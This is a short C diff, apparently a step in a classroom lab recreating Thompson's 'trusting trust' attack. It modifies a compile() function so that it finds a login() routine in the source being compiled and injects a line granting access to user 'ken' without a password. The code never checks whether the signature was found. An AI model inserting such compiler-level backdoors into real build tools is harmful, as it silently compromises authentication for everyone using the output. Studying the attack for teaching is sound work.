@@ -16,10 +16,8 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
-
-
+    // fprintf(fp, "%s", program);
+    // fclose(fp);
     /*****************************************************************
      * Step 1:
      */
@@ -27,11 +25,28 @@ static void compile(char *program, char *outname) {
     // match on the start of the login() routine:
     static char login_sig[] = "int login(char *user) {";
 
+    char* match_ptr = strstr(program, login_sig);
+
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-     
+    char* start_second_part = match_ptr + strlen(login_sig);
 
+    size_t len_first_part = match_ptr - program; // unchanged, before "int login ..."
+    size_t len_to_insert = strlen(login_attack);
+    size_t len_second_part = strlen(start_second_part); // unchange, follows login attack;
+    size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;
+
+    char new_prog[new_size];
+    strncpy(new_prog, program, len_first_part);
+    new_prog[len_first_part] = '\0'; // for strcat
+    strcat(new_prog, login_sig);
+    strcat(new_prog, login_attack);
+    strcat(new_prog, start_second_part);
+     
+    fprintf(fp, "%s", new_prog);
+
+    fclose(fp);
     /*****************************************************************
      * Step 2:
      */
